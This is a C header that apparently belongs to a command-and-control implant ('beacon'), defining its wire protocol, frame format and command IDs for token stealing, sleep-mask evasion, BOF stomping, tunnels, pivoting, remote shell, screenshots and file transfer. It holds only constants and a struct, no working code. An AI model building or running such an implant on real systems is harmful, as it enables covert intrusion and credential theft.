/* beacon/include/Wire.h
 * Wire-v0 protocol constants and NaxTask parse struct.
 * Must stay in lockstep with extender/agent_nonameax/pl_wire.go. */

#pragma once
#include <windows.h>

/* ========= [ message types ] ========= */
#define NAX_WIRE_REGISTER   0x01u
#define NAX_WIRE_HEARTBEAT  0x02u
#define NAX_WIRE_RESULT     0x03u
#define NAX_WIRE_NO_TASKS   0x80u
#define NAX_WIRE_TASK       0x81u
#define NAX_WIRE_PROFILE    0x82u

/* ========= [ command IDs ] ========= */
#define NAX_CMD_WHOAMI       0x10u
#define NAX_CMD_SLEEP        0x11u
#define NAX_CMD_EXIT_THREAD  0x12u
#define NAX_CMD_EXIT_PROCESS 0x13u
#define NAX_CMD_CD           0x14u
#define NAX_CMD_PWD          0x15u
#define NAX_CMD_MKDIR        0x16u
#define NAX_CMD_RMDIR        0x17u
#define NAX_CMD_CAT          0x18u
#define NAX_CMD_LS           0x19u
#define NAX_CMD_BOF          0x20u
#define NAX_CMD_SCREENSHOT   0x21u
#define NAX_CMD_DOWNLOAD     0x22u
#define NAX_CMD_PS_LIST      0x23u
#define NAX_CMD_PS_KILL      0x24u
#define NAX_CMD_PS_RUN       0x25u
#define NAX_CMD_UPLOAD       0x26u
#define NAX_CMD_RM           0x27u
#define NAX_CMD_SAVEMEMORY   0x2Au
#define NAX_CMD_CHUNKSIZE    0x2Bu
#define NAX_CMD_WATCHDOG_SET 0x2Cu

/* ========= [ download sub-commands ] ========= */
#define NAX_DL_START         0x01u
#define NAX_DL_CONTINUE      0x02u
#define NAX_DL_FINISH        0x03u
#define NAX_DL_CHUNK_DEFAULT 0x200000u /* 2 MB default */
#define NAX_DL_CHUNK_MAX     0x400000u /* 4 MB hard cap */
#define NAX_CMD_PROFILE      0x30u
#define NAX_CMD_PIVOT_EXEC   0x37u
#define NAX_CMD_LINK         0x38u
#define NAX_CMD_UNLINK       0x39u
#define NAX_CMD_JOB_LIST     0x28u
#define NAX_CMD_JOB_KILL     0x29u
#define NAX_CMD_BOF_STOMP    0x31u
#define NAX_CMD_SLEEPMASK_SET 0x32u
#define NAX_CMD_SLEEPOBF_CONFIG 0x33u
#define NAX_CMD_TOKEN_GETUID 0x50u
#define NAX_CMD_TOKEN_STEAL  0x51u
#define NAX_CMD_TOKEN_USE    0x52u
#define NAX_CMD_TOKEN_LIST   0x53u
#define NAX_CMD_TOKEN_RM     0x54u
#define NAX_CMD_TOKEN_REVERT 0x55u
#define NAX_CMD_TOKEN_MAKE   0x56u
#define NAX_CMD_TOKEN_PRIVS  0x57u
#define NAX_CMD_DLL_NOTIFY_LIST   0x3Au
#define NAX_CMD_DLL_NOTIFY_REMOVE 0x3Bu

/* ========= [ tunnel command IDs ] ========= */
#define NAX_CMD_TUNNEL_CONNECT_TCP  0x3Eu
#define NAX_CMD_TUNNEL_CONNECT_UDP  0x3Fu
#define NAX_CMD_TUNNEL_WRITE_TCP    0x40u
#define NAX_CMD_TUNNEL_WRITE_UDP    0x41u
#define NAX_CMD_TUNNEL_CLOSE        0x42u
#define NAX_CMD_TUNNEL_REVERSE      0x43u
#define NAX_CMD_TUNNEL_ACCEPT       0x44u
#define NAX_CMD_TUNNEL_PAUSE        0x45u
#define NAX_CMD_TUNNEL_RESUME       0x46u

/* ========= [ shell command IDs ] ========= */
#define NAX_CMD_SHELL_START  0x47u
#define NAX_CMD_SHELL_WRITE  0x48u
#define NAX_CMD_SHELL_CLOSE  0x49u

/* ========= [ job result types ] ========= */
#define NAX_JOB_OUTPUT    0x01u
#define NAX_JOB_COMPLETE  0x02u
#define NAX_JOB_KILLED    0x03u

/* ========= [ arch identifiers ] ========= */
#define NAX_ARCH_X64  0x01u
#define NAX_ARCH_X86  0x02u

/* ========= [ result status codes ] ========= */
#define NAX_STATUS_OK    0x00u
#define NAX_STATUS_ERR   0x01u
#define NAX_STATUS_ASYNC  0x10u
#define NAX_STATUS_TUNNEL 0x20u

/* ========= [ frame header size ] ========= */
/* Frame: type(1) | flags(1) | bodylen(4LE) = 6 bytes */
#define NAX_FRAME_HDR  6

/* ========= [ error codes ] ========= */
#define NAX_OK           0
#define NAX_ERR_INVAL   -1
#define NAX_ERR_NOMEM   -2
#define NAX_ERR_CRYPTO  -3
#define NAX_ERR_NET     -4
#define NAX_ERR_WIRE    -5
#define NAX_ERR_FAIL    -6

/* ========= [ parsed task ] ========= */
typedef struct {
    UINT32  TaskId;
    BYTE    CmdId;
    UINT32  ArgsLen;
    PBYTE   Args;    /* pointer into caller's buffer - not owned */
} NAX_TASK;
